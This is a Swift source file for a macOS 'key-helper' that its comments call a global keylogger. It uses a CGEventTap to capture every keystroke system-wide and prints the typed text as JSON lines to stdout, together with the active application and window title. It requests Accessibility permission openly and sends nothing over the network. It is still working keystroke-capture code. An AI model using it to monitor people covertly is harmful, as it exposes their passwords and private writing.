import Cocoa
import Carbon.HIToolbox

// key-helper: global keylogger using CGEventTap
// Outputs JSON lines to stdout: {"ts":..., "key":"...", "app":"...", "title":"..."}
// Requires Accessibility permission

// Flush stdout after every line
setbuf(stdout, nil)

// Get frontmost app and window title
func getFrontApp() -> (String, String) {
    let ws = NSWorkspace.shared
    let app = ws.frontmostApplication
    let appName = app?.localizedName ?? ""

    // Get window title via Accessibility API
    var title = ""
    if let pid = app?.processIdentifier {
        let appRef = AXUIElementCreateApplication(pid)
        var value: AnyObject?
        if AXUIElementCopyAttributeValue(appRef, kAXFocusedWindowAttribute as CFString, &value) == .success {
            let window = value as! AXUIElement
            var titleValue: AnyObject?
            if AXUIElementCopyAttributeValue(window, kAXTitleAttribute as CFString, &titleValue) == .success {
                title = titleValue as? String ?? ""
            }
        }
    }
    return (appName, title)
}

// Buffer to accumulate typed text
var buffer = ""
var lastFlush = Date()
var lastApp = ""
var lastTitle = ""

func flushBuffer() {
    let trimmed = buffer.trimmingCharacters(in: .whitespacesAndNewlines)
    guard !trimmed.isEmpty else { return }

    let (app, title) = getFrontApp()
    let ts = Int(Date().timeIntervalSince1970 * 1000)

    // Escape for JSON
    let escaped = trimmed
        .replacingOccurrences(of: "\\", with: "\\\\")
        .replacingOccurrences(of: "\"", with: "\\\"")
        .replacingOccurrences(of: "\n", with: "\\n")
        .replacingOccurrences(of: "\t", with: "\\t")
    let appEsc = app.replacingOccurrences(of: "\"", with: "\\\"")
    let titleEsc = title.replacingOccurrences(of: "\"", with: "\\\"")

    print("{\"ts\":\(ts),\"text\":\"\(escaped)\",\"app\":\"\(appEsc)\",\"title\":\"\(titleEsc)\"}")

    buffer = ""
    lastFlush = Date()
}

// Map CGKeyCode to readable string
func keyCodeToString(_ keyCode: UInt16, _ event: CGEvent) -> String? {
    // Special keys
    switch Int(keyCode) {
    case kVK_Return, kVK_ANSI_KeypadEnter:
        return "\n"
    case kVK_Tab:
        return "\t"
    case kVK_Space:
        return " "
    case kVK_Delete:
        // Backspace: remove last char from buffer
        if !buffer.isEmpty { buffer.removeLast() }
        return nil
    case kVK_ForwardDelete, kVK_Escape,
         kVK_Command, kVK_RightCommand,
         kVK_Shift, kVK_RightShift,
         kVK_Option, kVK_RightOption,
         kVK_Control, kVK_RightControl,
         kVK_CapsLock, kVK_Function,
         kVK_F1, kVK_F2, kVK_F3, kVK_F4, kVK_F5, kVK_F6,
         kVK_F7, kVK_F8, kVK_F9, kVK_F10, kVK_F11, kVK_F12,
         kVK_Home, kVK_End, kVK_PageUp, kVK_PageDown,
         kVK_LeftArrow, kVK_RightArrow, kVK_UpArrow, kVK_DownArrow:
        return nil
    default:
        break
    }

    // Use NSEvent to get the actual typed character (respects keyboard layout, shift, etc.)
    let nsEvent = NSEvent(cgEvent: event)
    if let characters = nsEvent?.characters, !characters.isEmpty {
        return characters
    }

    return nil
}

// Event tap callback
let callback: CGEventTapCallBack = { proxy, type, event, refcon in
    if type == .tapDisabledByTimeout || type == .tapDisabledByUserInput {
        // Re-enable the tap
        if let refcon = refcon {
            let tap = Unmanaged<CFMachPort>.fromOpaque(refcon).takeUnretainedValue()
            CGEvent.tapEnable(tap: tap, enable: true)
        }
        return Unmanaged.passUnretained(event)
    }

    let keyCode = UInt16(event.getIntegerValueField(.keyboardEventKeycode))

    if let str = keyCodeToString(keyCode, event) {
        buffer += str

        // Flush on Enter only — periodic timer handles idle flush
        if str == "\n" {
            flushBuffer()
        }
    }

    return Unmanaged.passUnretained(event)
}

// Check accessibility
let trusted = AXIsProcessTrustedWithOptions(
    [kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true] as CFDictionary
)

if !trusted {
    fputs("ERROR: Accessibility permission required. Grant it in System Settings > Privacy > Accessibility\n", stderr)
    exit(1)
}

// Create event tap for keyDown events
guard let eventTap = CGEvent.tapCreate(
    tap: .cgSessionEventTap,
    place: .headInsertEventTap,
    options: .listenOnly,  // passive, doesn't block or modify events
    eventsOfInterest: CGEventMask(1 << CGEventType.keyDown.rawValue),
    callback: callback,
    userInfo: nil
) else {
    fputs("ERROR: Failed to create event tap\n", stderr)
    exit(2)
}

// Pass the tap reference to the callback for re-enabling
let tapRef = Unmanaged.passUnretained(eventTap).toOpaque()

// Recreate with userInfo
guard let eventTap2 = CGEvent.tapCreate(
    tap: .cgSessionEventTap,
    place: .headInsertEventTap,
    options: .listenOnly,
    eventsOfInterest: CGEventMask(1 << CGEventType.keyDown.rawValue),
    callback: callback,
    userInfo: tapRef
) else {
    fputs("ERROR: Failed to create event tap\n", stderr)
    exit(2)
}

let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap2, 0)
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
CGEvent.tapEnable(tap: eventTap2, enable: true)

// Periodic flush every 5 seconds
Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { _ in
    if !buffer.isEmpty {
        flushBuffer()
    }
}

fputs("OK\n", stderr)
CFRunLoopRun()
